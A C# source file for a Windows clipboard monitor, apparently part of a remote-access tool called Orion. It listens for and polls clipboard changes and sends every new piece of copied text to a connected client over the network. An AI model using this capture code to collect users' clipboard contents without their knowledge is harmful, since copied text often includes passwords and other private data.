using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Orion.Common.Messages.Monitoring.Clipboard;
using Orion.Server.Networking;
using System.Diagnostics;

namespace Orion.Server.Helper
{
    public class ClipboardMonitor : NativeWindow, IDisposable
    {
        private const int WM_CLIPBOARDUPDATE = 0x031D;
        private Client _client;
        private string _lastClipboardText = string.Empty;
        private bool _isEnabled = false;
        private System.Threading.Timer _pollingTimer;

        private static string _lastReceivedFromClient = string.Empty;
        private static DateTime _lastReceivedFromClientTime = DateTime.MinValue;

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool RemoveClipboardFormatListener(IntPtr hwnd);

        public static void NotifyReceivedFromClient(string clipboardText)
        {
            _lastReceivedFromClient = clipboardText;
            _lastReceivedFromClientTime = DateTime.Now;
        }

        public ClipboardMonitor(Client client)
        {
            _client = client;
            CreateHandle(new CreateParams());
            AddClipboardFormatListener(this.Handle);

            _pollingTimer = new System.Threading.Timer(PollClipboard, null, Timeout.Infinite, Timeout.Infinite);
        }

        public bool IsEnabled
        {
            get => _isEnabled;
            set
            {
                _isEnabled = value;

                if (_isEnabled)
                {
                    _pollingTimer.Change(0, 500);
                    Debug.WriteLine("Clipboard polling timer started");
                }
                else
                {
                    _pollingTimer.Change(Timeout.Infinite, Timeout.Infinite);
                    Debug.WriteLine("Clipboard polling timer stopped");
                }
            }
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE && _isEnabled)
            {
                Task.Run(() => ClipboardCheck());
            }

            base.WndProc(ref m);
        }

        private void ClipboardCheck()
        {
            if (!_isEnabled) return;

            try
            {
                if (Thread.CurrentThread.GetApartmentState() == ApartmentState.STA)
                {
                    GetAndSendClipboardText();
                }
                else
                {
                    var thread = new Thread(GetAndSendClipboardText);
                    thread.SetApartmentState(ApartmentState.STA);
                    thread.Start();
                    thread.Join(100);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Clipboard monitor error: {ex.Message}");
            }
        }

        private void GetAndSendClipboardText()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    string clipboardText = Clipboard.GetText();

                    if (!string.IsNullOrEmpty(clipboardText) && clipboardText != _lastClipboardText)
                    {
                        bool wasRecentlyReceivedFromClient =
                            _lastReceivedFromClient.Equals(clipboardText) &&
                            (DateTime.Now - _lastReceivedFromClientTime).TotalSeconds < 3;

                        if (!wasRecentlyReceivedFromClient)
                        {
                            _lastClipboardText = clipboardText;
                            Debug.WriteLine($"Sending clipboard text: {clipboardText.Substring(0, Math.Min(20, clipboardText.Length))}...");
                            _client.Send(new SendClipboardData { ClipboardText = clipboardText });
                        }
                        else
                        {
                            _lastClipboardText = clipboardText;
                        }
                    }
                    else
                    {
                    }
                }
                else
                {
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error getting clipboard text: {ex.Message}");
            }
        }

        private void PollClipboard(object state)
        {
            if (_isEnabled)
            {
                ClipboardCheck();
            }
        }

        public void Dispose()
        {
            RemoveClipboardFormatListener(Handle);
            _pollingTimer?.Dispose();
            DestroyHandle();
        }
    }
}